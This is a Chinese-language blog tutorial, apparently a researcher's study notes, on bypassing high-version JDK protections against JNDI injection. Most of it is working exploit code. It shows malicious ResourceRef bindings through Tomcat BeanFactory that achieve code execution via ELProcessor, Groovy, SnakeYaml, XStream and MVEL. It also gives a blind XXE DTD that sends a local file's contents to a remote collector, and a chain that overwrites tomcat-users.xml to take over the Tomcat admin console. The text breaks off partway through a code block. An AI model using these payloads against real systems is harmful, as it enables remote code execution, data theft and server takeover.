---
title: "JNDI高版本注入"
onlyTitle: true
date: 2024-12-01 15:09:23
categories:
- java
- RMI
tags:
- JNDI
top: true
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8120.png
---



JNDI高版本注入可以说是java安全大集合了。涉及了许多框架漏洞的组合使用，当分析完JNDI高版本时，我认为也算是正式入门JAVA安全了

jndi注入第一需要在影响版本内，第二需要出网

jdk8<8u191之前，ldap都能打，且不需要其他依赖库。8u191<jdk<8u241，能打JRMP

高版本也能绕过打JNDI：

https://www.cnblogs.com/bitterz/p/15946406.html#211-javaxelelprocessoreval

回想之前的修复方式，都是把trustURLCodebase置为了false，虽然没办法加载远程恶意类了，不过可以通过加载服务器的本地类构造恶意代码



## jndi回顾

JNDI demo（yakit or marshelsec生成恶意类）

```java
public class JNDIRMIClient {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        RemoteInterface remoteObject = (RemoteInterface) initialContext.lookup("ldap://172.21.240.1:8599/RuntimeEvil");//yakit
        remoteObject.sayHello("JNDI");
    }
}
```

低版本(<8u191)jndi ldap中，跟进到DirectoryManager.getObjectInstance：

* 用getObjectFactoryFromRefrence从远端refrence获取类工厂，并实例化类工厂（我们绑定的恶意类工厂，这一步就完成了RCE）
* getObjectInstance从类工厂加载类并实例化

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241018112434905.png)



跟进到NamingManager.getObjectFactoryFromRefrence，发现从Reference加载类的过程如下：

* 先双亲委派从本地加载类
* 如果本地加载不到，从codebase加载

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241018104908789.png)

1. helper.loadClass(factory) -> VersionHelper12.loadClass，用系统类加载器加载类，走双亲委派从本地加载

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241018105416861.png)

2. 从codebase加载类

* jdk<191，VersionHelper12从codebase加载如下，用URLClassLoader获取远端类工厂，没有任何过滤

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241018112713922.png)

获取后Class.forName初始化

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241018113447188.png)

初始化类后直接newInstance实例化，并转为ObjectFactory

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241018113150097.png)

* jdk>=191，VersionHelper12 trustURLCodebase==true才从远端加载类工厂

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241018150242252.png)

不能从远端加载类工厂了，那我们换个思路

从本地加载类工厂，然后找getObjectInstance进行下一步利用

既然要找个能用的类工厂，该类必须满足实现ObjectFactory接口，才能顺利强转

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241018151408823.png)

# Tomcat 8

导入使用Tomcat类：

```xml
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-catalina</artifactId>
    <version>8.5.56</version>
</dependency>
```

## beanFactory

Tomcat8下，org.apache.naming.factory.BeanFactory存在利用点

BeanFactory.getObjectInstance很长，大致流程如下：

不是ResourceRef子类直接退出

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241018165205453.png)

* 加载类并实例化

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241018163918904.png)

* 从ref对象中获取名为forceString的对象，并将其转化为字符串value
* 将value按逗号分割成多个参数，每个参数形如`name=method`的键值对
* 如果参数包含等号，则将其按等号分为参数名和方法名，`=`前面为参数，`=`后面为方法名；如果参数不包含等号，则生成默认的setter方法（首字母大写加set前缀）
* 使用反射获取对应的方法，参数类型为String

很明显，能获取参数个数为1，参数类型为String的任意方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241018164214928.png)

* 遍历每个属性，跳过特定的属性（scope,auth,forceString,singleton），如果找到setter方法，则调用此方法设置属性值

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241018164853102.png)

找遍全文，发现这个函数完全没有用第二个参数name，也就是我们传入的reference第一个参数（需要加载的类名），好神金（估计只是为了满足重写getObjectInstance

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241018214024895.png)



构造一个恶意ResourceRef类，通过forceString参数，能调用任意对象的方法

类需要有无参构造函数，被利用方法需满足参数个数为1，参数类型为String

哪个方法满足要求，且能达到RCE呢？

### javax.el.ELProcessor#eval

```xml
<dependency>
    <groupId>org.apache.tomcat.embed</groupId>
    <artifactId>tomcat-embed-el</artifactId>
    <version>8.5.56</version> <!-- 使用与你的Tomcat版本相匹配的版本 -->
</dependency>
```

众所周知，Tomcat自带的类ELProcessor可以进行EL表达式注入

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241018195943377.png)

表达式注入的入口即javax.el.ELProcessor#eval，参数正好满足个数为1，类型为String

EL表达式依赖：

```java
<dependency>
    <groupId>org.apache.tomcat.embed</groupId>
    <artifactId>tomcat-embed-el</artifactId>
    <version>8.5.56</version> <!-- 使用与你的Tomcat版本相匹配的版本 -->
</dependency>
```

EL表达式Payload：

```java
ELProcessor elProcessor = new javax.el.ELProcessor();
elProcessor.eval("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/bash','-c','calc']).start()\")");
```

ResourceRef接收的第一个参数即类名，应该传ELProcesser。但是构造函数并没有看见能传forceString的地方，但注意到都是通过Reference.add添加属性

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241018204028148.png)

我们依葫芦画瓢也调用Reference.add添加forceString。这里ResourceRef是Reference的子类

```java
ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
ref.add(new StringRefAddr("forceString", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('calc')\")=eval"));
```

ResourceRef作为Reference子类，可以直接进行JNDI绑定

我们直接试试呢？

```java
    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1099);
        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('calc')\")=eval"));
        InitialContext context = new InitialContext(env);
        context.bind("remoteImpl", ref);
    }
```

发现并没有执行

调试跟进到BeanFactory.getObjectInstance，发现在invoke之前，由于propName为forceString，跳过了本次循环。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241020164042052.png)

我们先用forceString把setterName设置为eval，属性名设置为x，并put进forced

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241020164741174.png)

然后注意循环是在所有Entry循环

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241020164640261.png)

第二次在forced根据属性名取方法，也就是eval方法，参数为第二个Entry的Value

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241020164805044.png)

所以先传一个`("forceString","x=eval")`，再传一个`("x","payload")`即可RCE

```java
public class jndi_highVersion_Tomcat {
    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1099);
        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('calc')\")"));
//        ref.add(new StringRefAddr("forceString", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('calc')\")=eval"));
        InitialContext context = new InitialContext(env);
        context.bind("remoteImpl", ref);
    }
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241020165100647.png)



攻击过程：

执行lookup->实例化factoryLocation路径下factory->调用factory的getObjectInstance->BeanFactory.getObjectInstance->根据forceString解析方法名和占位参数->填充真参数invoke反射调用ELProcessor.eval



不仅ELProcessor能利用，还有很多其他类

浅蓝师傅给出了许多满足BeanFactory调用要求（类有无参构造方法，代码执行方法参数个数为1，参数类型为String，可以后续利用）的类，尽管有一些并不能达到RCE，但仍有利用价值

https://tttang.com/archive/1405/

### MLet

MLet.addURL+URLClassLoader.loadClass

jdk自带的javax.management.loading.MLet，addURL方法参数满足要求

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241020171153802.png)

调用了URLClossLoader.addURL

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241020171234140.png)

MLet继承URLClassLoader，也能用URLClassLoader.loadClass

只可惜loadClass无法触发静态代码块，也无法RCE

> 虽然无法RCE，但可以用来进行gadget探测。例如在不知道当前Classpath存在哪些可用的gadget时，就可以通过MLet进行第一次类加载，如果类加载成功就不会影响后面访问远程类。

探测ELProcessor和是否可外联：

```java
    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1099);
        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        ResourceRef ref = new ResourceRef("javax.management.loading.MLet", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadClass,b=addURL,c=loadClass"));
        ref.add(new StringRefAddr("a", "javax.el.ELProcessor"));//测试ELProcessor是否可用
        ref.add(new StringRefAddr("b", "http://127.0.0.1:8888/"));
        ref.add(new StringRefAddr("c", "JNDI_RuntimeEvil"));//测试是否可外联
        InitialContext context = new InitialContext(env);
        context.bind("remoteImpl", ref);
    }
```



### GroovyShell

```xml
</dependency>
<dependency>
    <groupId>org.codehaus.groovy</groupId>
    <artifactId>groovy-all</artifactId>
    <version>2.4.15</version>
</dependency>
```

GroovyShell.evaluate()执行groovy代码，参数可以是字符串：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241022141149375.png)

一般用GroovyShell执行代码如下：

```java
        GroovyShell shell = new GroovyShell();
        String content = "'calc'.execute()";
//        shell.evaluate(content);//String evaluate
        shell.evaluate(new StringReader(content));//Reader evaluate
```



POC：

```java
public class GroovyShell {
    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1099);
        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        ref.add(new StringRefAddr("x", "'calc'.execute()"));
//        ref.add(new StringRefAddr("forceString", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('calc')\")=eval"));
        InitialContext context = new InitialContext(env);
        context.bind("remoteImpl", ref);
    }
}
```



### GroovyClassLoader

关于GroovyClassLoader：

https://godownio.github.io/2024/10/21/groovy-lou-dong/#GroovyClassLoader

GroovyClassLoader有loadClass和defineClass

GroovyClassLoader.parseClass支持从File，字符串加载groovy类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021190409940.png)

利用AST注解可以在编译时就执行代码，而不用等到实例化

```groovy
@groovy.transform.ASTTest(value={assert Runtime.getRuntime().exec("calc")})
class Person{}
```

* 利用GroovyClassLoader.parseClass完成JNDI：

```java
public class GroovyClassLoader {
    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1099);
        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=parseClass"));
        ref.add(new StringRefAddr("x", "@groovy.transform.ASTTest(value={assert Runtime.getRuntime().exec(\"calc\")})\n" +
                "class Person{}"));
        InitialContext context = new InitialContext(env);
        context.bind("remoteImpl", ref);
    }
}
```



* 利用GroovyClassLoader.addClasspath->loadClass完成JNDI：

```java
public class GroovyClassLoader_URL {
    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1099);
        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=addClasspath,y=loadClass"));
        ref.add(new StringRefAddr("x", "http://127.0.0.7:8888/"));
        ref.add(new StringRefAddr("y", "groovy_RuntimeEvil"));
        InitialContext context = new InitialContext(env);
        context.bind("remoteImpl", ref);
    }
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028223606647.png)

注意把本地的groovy_RuntimeEvil排除在构建目录外，不然每次编译都弹计算器，还报错，怪不爽的

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028223131829.png)



### SnakeYaml

```xml
<dependency>
    <groupId>org.yaml</groupId>
    <artifactId>snakeyaml</artifactId>
    <version>1.27</version>
</dependency>
```

利用`Yaml().load(String)`

SnakeYaml和fastjson，jackson一样，Yaml.load()会调用类的构造函数和setter。能在这里利用，是因为SnakeYaml有Yaml的无参构造函数实例化

https://godownio.github.io/2024/10/28/snakeyaml/#JdbcRowSetImpl

SnakeYaml能用的payload都能用，比如ScriptEngineManager

```java
public class ScriptEngineManager {
    public static void main(String[] args) throws Exception
    {
        String poc = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:8888/EvilServiceScriptEngineFactory_jdk8.jar\"]]]]\n";
        LocateRegistry.createRegistry(1099);
        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=load"));
        ref.add(new StringRefAddr("x", poc));
        InitialContext context = new InitialContext(env);
        context.bind("remoteImpl", ref);
    }
}
```

恶意jar包：

https://github.com/godownio/java_unserial_attackcode/blob/master/src/main/java/org/exploit/third/SnakeYaml/EvilServiceScriptEngineFactory_jdk8.jar



### XStream

如果目标XStream<=1.4.17，还能直接打XStream().fromXML(String)

```xml
<dependency>
    <groupId>com.thoughtworks.xstream</groupId>
    <artifactId>xstream</artifactId>
    <version>1.4.17</version>
</dependency>
```

https://godownio.github.io/2024/10/31/xstream/#%E4%B8%8D%E5%87%BA%E7%BD%91CVE-2021-39149

不出网打TemplatesImpl POC：

```java
public class TemplatesImpl {
    public static void main(String[] args) throws Exception{
        String Evilcls = readClassStr();
        String payload = "<linked-hash-set>\n" +
                "    <dynamic-proxy>\n" +
                "        <interface>map</interface>\n" +
                "        <handler class='com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl'>\n" +
                "            <classToInvocationHandler class='linked-hash-map'/>\n" +
                "            <defaultHandler class='sun.tracing.NullProvider'>\n" +
                "                <active>true</active>\n" +
                "                <providerType>java.lang.Object</providerType>\n" +
                "                <probes>\n" +
                "                    <entry>\n" +
                "                        <method>\n" +
                "                            <class>java.lang.Object</class>\n" +
                "                            <name>hashCode</name>\n" +
                "                            <parameter-types/>\n" +
                "                        </method>\n" +
                "                        <sun.tracing.dtrace.DTraceProbe>\n" +
                "                            <proxy class='com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl' serialization='custom'>\n" +
                "                                <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
                "                                    <default>\n" +
                "                                        <__name>Pwnr</__name>\n" +
                "                                        <__bytecodes>\n" +
                "                                            <byte-array>" +Evilcls+ "</byte-array>\n" +
                "                                            <byte-array>yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJ</byte-array>\n" +
                "                                        </__bytecodes>\n" +
                "                                        <__transletIndex>-1</__transletIndex>\n" +
                "                                        <__indentNumber>0</__indentNumber>\n" +
                "                                    </default>\n" +
                "                                    <boolean>false</boolean>\n" +
                "                                </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
                "                            </proxy>\n" +
                "                            <implementing__method>\n" +
                "                                <class>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</class>\n" +
                "                                <name>getOutputProperties</name>\n" +
                "                                <parameter-types/>\n" +
                "                            </implementing__method>\n" +
                "                        </sun.tracing.dtrace.DTraceProbe>\n" +
                "                    </entry>\n" +
                "                </probes>\n" +
                "            </defaultHandler>\n" +
                "        </handler>\n" +
                "    </dynamic-proxy>\n" +
                "</linked-hash-set>";
        LocateRegistry.createRegistry(1099);
        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        ResourceRef ref = new ResourceRef("com.thoughtworks.xstream.XStream", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=fromXML"));
        ref.add(new StringRefAddr("x", payload));
        InitialContext context = new InitialContext(env);
        context.bind("remoteImpl", ref);
    }
    public static String readClassStr() throws IOException {
        byte[] code = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        return Base64.encode(code);
    }
}
```



### MVEL

```xml
<dependency>
    <groupId>org.mvel</groupId>
    <artifactId>mvel2</artifactId>
    <version>2.2.8.Final</version>
</dependency>
```

不限MVEL版本

相信很多人没遇到过MVEL，这里简单介绍一下。MVEL类似于OGNL

看几个case：

1. 运算

```java
      public static void main(String[] args) {
          String expression = "2 + 3";
          Object result = MVEL.eval(expression);
          System.out.println("Result: " + result); // 输出: Result: 5
      }
```

2. 利用HashMap传参

```java
      public static void main(String[] args) {
          Map<String, Object> vars = new HashMap<>();
          vars.put("a", 10);
          vars.put("b", 20);

          String expression = "a + b";
          Object result = MVEL.eval(expression, vars);
          System.out.println("Result: " + result); // 输出: Result: 30
      }
```

3. 利用HashMap进行函数传参

```java
    public static void main(String[] args) {
        String expression = "def addTwo(num1, num2) { num1 + num2; } val = addTwo(a, b);";
        Map<String, Object> paramMap = new HashMap();
        paramMap.put("a", 2);
        paramMap.put("b", 4);
        Object object = MVEL.eval(expression, paramMap);
        System.out.println(object); // 6
    }
```

4. 先编译表达式后执行，compileExpression->executeExpression。注意是编译成Serializable

```java
  public class MVELExample {
      public static void main(String[] args) {
          String expression = "a + b";
          Serializable compiledExpr = MVEL.compileExpression(expression);

          Map<String, Object> vars = new HashMap<>();
          vars.put("a", 10);
          vars.put("b", 20);

          Object result = MVEL.executeExpression(compiledExpr, vars);
          System.out.println("Result: " + result); // 输出: Result: 30
      }
  }
```

执行java代码：

```java
    public static void main(String[] args) {
        Map vars = new HashMap();
        String expression1 = "Runtime.getRuntime().exec(\"open -a Calculator\")";
//        String expression2 = "new java.lang.ProcessBuilder(new java.lang.String[]{\"whoami\"}).start()";
        Serializable serializable = MVEL.compileExpression(expression1);
        vars.put("1",expression1);
        MVEL.executeExpression(serializable,vars);
    }
```

换成eval当然也可以

但是MVEL.eval似乎并不能在高版本JNDI中被利用，因为在这里eval是个static方法

浅蓝师傅找到了通过`org.mvel2.sh.ShellSession#exec(String)`->`org.mvel2.sh.command.basic.PushContext`->`MVEL.eval`执行MEVL表达式的方法

ShellSession.exec先把命令压到了inBuffer，然后调用`_exec`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241105153626699.png)

然后`_exec`内，从inBuffer取出了命令，如果commands包含了该命令，就调用execute

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241105154433467.png)

构造函数里初始化了commands静态变量

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241105154543356.png)

其中可以看到push命令返回的PushContext

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241105154649197.png)

PushContext.execute调用了MVEL.eval

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241105154718688.png)

JNDI POC如下：

```java
public class ShellSession {
    public static void main(String[] args) throws Exception
    {
        String expression1 = "Runtime.getRuntime().exec(\"calc\")";
        LocateRegistry.createRegistry(1099);
        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        ResourceRef ref = new ResourceRef("org.mvel2.sh.ShellSession", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=exec"));
        ref.add(new StringRefAddr("x", expression1));
        InitialContext context = new InitialContext(env);
        context.bind("remoteImpl", ref);
    }
}
```



beanFactory还有一个NativeLibLoader可以利用，由于手法和原理比较复杂，另外再分析（挖坑）

## MemoryUserDatabaseFactory XXE

如果beanFactory被列入黑名单呢？

`org.apache.catalina.users.MemoryUserDatabaseFactory`的getObjectInstance也存在可利用的点

首先该类满足继承了ObjectFactory

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241105164418525.png)

reference不是org.apache.catalina.UserDatabase会直接return

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241107103524783.png)

getObjectInstance会先按name实例化MemoryUserDatabase

并从ref中获取pathname,readonly,watchSource，并调用open。如果readonly不为true（不是只读），就会调用database.save

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241105164618507.png)

跟进到open，发现这是个处理配置文件的方法，配置文件正好是XML

可以看到，是用URL类去远程加载pathName配置文件，并用Digester.parse去解析XML文档

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241105170446352.png)

中间没有任何过滤，可以打JAVA的XXE。关于java的XXE：（注意别TM在java里用php伪协议了）

https://godownio.github.io/2024/11/06/java-xxe/

XXE无回显盲注 POC：

xxe.dtd，其中URL为回显的vps

```dtd
<!ENTITY % file SYSTEM "file:///C:/Users/Administrator/Desktop/test.txt">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://172.25.0.1:8085/?p=%file;'>">
```

yakit反连地址

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241107144602517.png)

XMLpayload.dtd

```dtd
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE payload [
        <!ENTITY % remote SYSTEM "http://127.0.0.1:8888/xxe.dtd">
        %remote;%int;%send;
        ]>
<payload>1</payload>
```

JNDI Server

```java
public class MemoryUserXXE {
    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1099);
        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        ResourceRef ref = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "", true, "org.apache.catalina.users.MemoryUserDatabaseFactory", null);
        ref.add(new StringRefAddr("pathname", "http://127.0.0.1:8888/XMLpayload.dtd"));
        InitialContext context = new InitialContext(env);
        context.bind("remoteImpl", ref);
    }
}
```

Client请求时，dnslog收到带test.txt内容的请求

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241107144545065.png)



## MemoryUserDatabaseFactory+beanFactory RCE

个人认为这是一个仅用于学习的trick

这个RCE是先利用FileUtils类创建目录，然后用MemoryUserDatabase.save写文件，能打的话目标机肯定有tomcat，进而覆盖tomcat-user.xml登录后台，也能写webshell

上文提到，如果传入的readonly不为真（只读），那会调用save()方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241122214429826.png)

save方法中，如果不是只读，`getReadonly ! = true`；且可写`isWriteable`，就会创建一个新文件流

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241122221819332.png)

注意目标文件路径是fileNew参数，也就是`环境变量catalina.base + pathnameNew`，这里环境变量catalina.base一般都是`/usr/apache-tomcat-8.5.73/`，后面是你的tomcat版本

文件内容呢？通过writer.println写入，先写入xml的前言，然后依次写入role,group,user

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241123100031946.png)

role,group,user怎么来的呢？

在之前调用的open()方法中，调用了addFactoryCreate，中间的解析就不看了，简单来说就是会解析`<role rolename="manager-jmx"/>`这种形式到role

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241123100401357.png)



浅蓝师傅的这段描述相当详细

这里pathname必须是个URL对吧，这样你才能open()从远程vps读文件内容，然后调用addFactoryCreate；你又要写到指定目录对吧，那肯定要用目录穿越。假如 `CATALINA.BASE=/usr/apache-tomcat-8.5.73/`,`pathname=http://127.0.0.1:8888/../../conf/tomcat-users.xml`

他们组成的文件路径就是`/usr/apache-tomcat-8.5.73/http:/127.0.0.1:8888/../../conf/tomcat-users.xml`，以此写到`/user/apache-tomcat-8.5.73/conf/tomcat-users.xml`

在 Windows 下这样没问题，但如果是Linux系统的话，目录跳转符号前面的目录是必须存在的。

必须要让 `CATALINA.BASE`文件夹下有`/http:/127.0.0.1:8888/` 这个目录的存在，用BeanFactory找一个可以创建目录的类，这里找到的是`org.h2.store.fs.FileUtils`，这是一个H2 Database的类，需要JDK11及以上

```xml
<dependency>
    <groupId>com.h2database</groupId>
    <artifactId>h2</artifactId>
    <version>2.3.232</version>
</dependency>
```

FileUtils.createDirectory如下，符合单参数，string类型

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241122220629565.png)

先创建`http:`目录，在创建your-vps目录，在这里就是`127.0.0.1:8888`

```java
public static void main(String[] args) throws Exception {
    LocateRegistry.createRegistry(1099);
    Hashtable<String, String> env = new Hashtable<>();
    env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
    env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
    ResourceRef ref1 = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "", true, "org.h2.store.fs.FileUtils", null);
    ref1.add(new StringRefAddr("forceString", "x=createDirectory,y=createDirectory"));
    ref1.add(new StringRefAddr("x", "../http:"));//一般是在tomcat-base/bin下运行，要创建tomcat-base/http:目录，所以要写../
    ref1.add(new StringRefAddr("y", "../http:/127.0.0.1:8888"));
    InitialContext context = new InitialContext(env);
    context.bind("remoteImpl", ref1);//创建http:目录，然后创建127.0.0.1:8888目录
}
```

### 写tomcat-users.xml 登录Tomcat后台

先准备一个tomcat-users.xml

```xml
<role rolename="manager-jmx"/>
<role rolename="admin-script"/>
<role rolename="admin-gui"/>
<role rolename="manager-script"/>
<role rolename="manager-status"/>
<role rolename="manager-gui"/>
<user username="bule" password="123456" group="" roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script"/>
```

开个http服务，需要在`../../conf/tomcat-users.xml`放置文件

先打上面创建目录的JNDI

然后打覆盖配置文件JNDI：

```java
public static void main(String[] args) throws Exception {
    LocateRegistry.createRegistry(1099);
    Hashtable<String, String> env = new Hashtable<>();
